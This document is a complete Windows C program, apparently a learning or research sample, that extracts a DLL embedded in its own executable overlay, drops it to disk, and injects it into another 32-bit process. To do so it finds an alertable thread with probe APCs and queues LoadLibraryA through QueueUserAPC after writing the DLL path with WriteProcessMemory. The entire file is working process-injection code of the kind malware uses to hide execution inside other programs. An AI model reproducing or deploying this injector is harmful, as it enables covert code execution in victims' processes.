#include <windows.h>
#include <TlHelp32.h> 
#include <string.h>
#include <stdio.h>


typedef void* HANDLE;

size_t dllSize = 0;
char *dll = NULL;

HANDLE threadHandlesArray[MAXIMUM_WAIT_OBJECTS], eventHandlesArray[MAXIMUM_WAIT_OBJECTS];
DWORD processPidsArray[MAXIMUM_WAIT_OBJECTS];

int is64bit(long pid) {
    SYSTEM_INFO sysinfo;
    HANDLE hProcess;
    BOOL isWow64;

    // if OS is not 64 bit, no process will be either   
    GetNativeSystemInfo(&sysinfo);
    if (sysinfo.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64) 
        return 0;

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);;
    if (hProcess == NULL)
        return -1;

    if (! IsWow64Process(hProcess, &isWow64)) {
        CloseHandle(hProcess);
        return -1;
    }

    CloseHandle(hProcess);
    if (isWow64)
        return 0;
    else
        return 1;
}

//get offset of overlay
int getSizeOfPeFile(){
    HMODULE baseAddress = GetModuleHandle(NULL);

    IMAGE_DOS_HEADER* IDH = (IMAGE_DOS_HEADER*)baseAddress;

    IMAGE_NT_HEADERS* INH = (IMAGE_NT_HEADERS*)((int)baseAddress + IDH->e_lfanew);

    int size = INH->OptionalHeader.SizeOfHeaders;

    DWORD sectionLocation = (DWORD)INH + sizeof(DWORD) /*PE signature*/ + (DWORD)(sizeof(IMAGE_FILE_HEADER)) + (DWORD)INH->FileHeader.SizeOfOptionalHeader;

    DWORD sectionSize = (DWORD)sizeof(IMAGE_SECTION_HEADER); //40 bytes

    DWORD importDirectoryRVA = INH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    for (int i = 0; i < INH->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
        size = size + sectionHeader->SizeOfRawData;
        sectionLocation = sectionLocation +sectionSize;
    }

    return size;
}   

void getOverlay(){
    int offsetOfOverlay = getSizeOfPeFile();
    char *fileName = (char *)malloc(MAX_PATH);
    GetModuleFileNameA(NULL,fileName,MAX_PATH);
    if( strlen(fileName) == 0){
        perror("Could not retrive filename.\n");
        exit(EXIT_FAILURE);
    }

    FILE *fp = fopen(fileName, "rb"); // read mode

    if (fp == NULL){
        perror("Error while opening the file.\n");
        exit(EXIT_FAILURE);
    }


    long int sizeOfFile = ftell(fp);

    if ( fseek(fp, offsetOfOverlay, SEEK_SET) != 0 ) {
        perror("Could not set the file position.\n");
        exit(EXIT_FAILURE);
    }

    fread(&dllSize, 4, 1, fp); //first 4 bytes of overlay are size of the file

    dll = (char *)malloc(dllSize);

    fread(dll, 1, dllSize, fp);

    fclose(fp);
}

//create DLL on disks
char* dropDll(){
    HANDLE hFile;
    char *fileName = "apcDllInjection.dll";

    getOverlay();

    hFile = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //create file
    if (hFile == INVALID_HANDLE_VALUE){
        return 0;
    }
    if(WriteFile(hFile, dll, dllSize, NULL, NULL)){
        //getting absoluthe path to created DLL
        TCHAR wd[MAX_PATH] = { 0 };
        GetCurrentDirectory(MAX_PATH, wd);
        char *filePath = (char *)malloc(MAX_PATH);
        strcpy(filePath, wd);
        filePath = strcat(filePath, "\\");
        filePath = strcat(filePath, fileName);
        CloseHandle(hFile);
        return filePath;
    }
    CloseHandle(hFile);
    return 0;
}

int getRemoteThreadHandles(){
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    int index = 0;
    int ownPid = GetCurrentProcessId();

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (!Thread32First(hThreadSnap, &te32)) {
        CloseHandle(hThreadSnap);
        return 0;
    }

    do {
        if (is64bit(te32.th32OwnerProcessID) == 0){ //check if is 32 bit
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
            if (hThread != INVALID_HANDLE_VALUE && te32.th32OwnerProcessID != ownPid) {
                processPidsArray[index] = te32.th32OwnerProcessID; //save PID to array
                threadHandlesArray[index++] = hThread; //save thread handle to array
            }
        }
        if(index >= MAXIMUM_WAIT_OBJECTS){
            break;
        }
    } while (Thread32Next(hThreadSnap, &te32));
    
    CloseHandle(hThreadSnap);
    return index;

}

//Find out alertable threads
int findAlertableThread(HANDLE hKernel32, int remoteThreadHandlesCount){
    HANDLE duplicateHandles[MAXIMUM_WAIT_OBJECTS];
    LPVOID f  = GetProcAddress(hKernel32, "SetEvent");

    for (int i = 0; i < remoteThreadHandlesCount; i++){
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processPidsArray[i]);
        if(hProcess == INVALID_HANDLE_VALUE){
            continue; //Could not open remote thread
        }

        eventHandlesArray[i] = CreateEvent(NULL, FALSE, FALSE, NULL);

        DuplicateHandle(GetCurrentProcess(), eventHandlesArray[i], hProcess, &duplicateHandles[i], 0, FALSE, DUPLICATE_SAME_ACCESS);   

        QueueUserAPC(f, threadHandlesArray[i], (ULONG_PTR)duplicateHandles[i]);
        
        CloseHandle(hProcess);
    }

    HANDLE hAlertableThread = NULL;
    DWORD index = 0;
    DWORD i = WaitForMultipleObjects(remoteThreadHandlesCount, eventHandlesArray, FALSE, 5000); //get index of alertable thread
    if(i != WAIT_TIMEOUT) {
        index = i;
    }

    for(i=0; i<remoteThreadHandlesCount; i++) {
        CloseHandle(eventHandlesArray[i]);
        CloseHandle(duplicateHandles[i]);
        if(index != i) 
            CloseHandle(threadHandlesArray[i]);
    }
    return index;
}

int apcDllInjection(){
    LPVOID loadLibraryAddress = NULL;
    HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32.dll"));
    if (hKernel32 != 0){
        loadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
    }
    if (loadLibraryAddress == NULL){
        return 6; //Could not found LoadLibrary function
    }

    int pid = 0;

    int remoteThreadHandlesCount = getRemoteThreadHandles();
    if (remoteThreadHandlesCount == 0 ){
        return 8; //Could not get remote thread hadnles
    }
        
    int index = findAlertableThread(hKernel32, remoteThreadHandlesCount);
    HANDLE hAlertableThread = threadHandlesArray[index];
    pid = processPidsArray[index];

    
    if (hAlertableThread == NULL){
        return 10;
    }

    char *dllPath = (char *)dropDll();
    if (dllPath == 0){
        return 2; //DLL could not be created
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        return 3; //Process could not be opened
    }
    
    int dllPathSize = strlen(dllPath);
    int *allocAddress;
    allocAddress = VirtualAllocEx(hProcess, NULL, dllPathSize + 1, MEM_COMMIT, PAGE_READWRITE);
    if(allocAddress == NULL){
        return 4; //Could not allocate memory in remote processse
    }

    if (WriteProcessMemory(hProcess, allocAddress, dllPath, dllPathSize, NULL) == 0){
        return 5; //Could not write to remote process
    }

    if(QueueUserAPC(loadLibraryAddress, hAlertableThread, (ULONG_PTR)allocAddress)){
        return 9;
    }

    CloseHandle(hProcess);
    return 0;
}


int main(int argc, char *argv[]){
    switch (apcDllInjection())
    {
    case 0:
        MessageBox(0,"Remote DLL injection successfull.","Success",0);
        return 0;
    case 1:
        MessageBox(0,"Remote DLL injection failed. Process does not exist.","Failure",0);
        return 1;
    case 2:
        MessageBox(0,"Remote DLL injection failed. DLL could not be created.","Failure",0);
        return 1;
    case 3:
        MessageBox(0,"Remote DLL injection failed. Process could not be opened.","Failure",0);
        return 1;
    case 4:
        MessageBox(0,"Remote DLL injection failed. Could not allocate memory in remote process.","Failure",0);
        return 1;
    case 5:
        MessageBox(0,"Remote DLL injection failed. Could not write to remote process.","Failure",0);
        return 1;
    case 6:
        MessageBox(0,"Remote DLL injection failed. Could not found LoadLibrary function.","Failure",0);
        return 1;
    case 7:
        MessageBox(0,"Remote DLL injection failed. Could not open remote thread.","Failure",0);
        return 1;
    case 8:
        MessageBox(0,"Remote DLL injection failed. Could not get remote thread handles.","Failure",0);
        return 1;
    case 9:
        MessageBox(0,"Remote DLL injection failed. Could not create APC.","Failure",0);
        return 1;
    case 10:
        MessageBox(0,"Remote DLL injection failed. Could not find alertable thread.","Failure",0);
        return 1;
    }
    
    return 1;
}
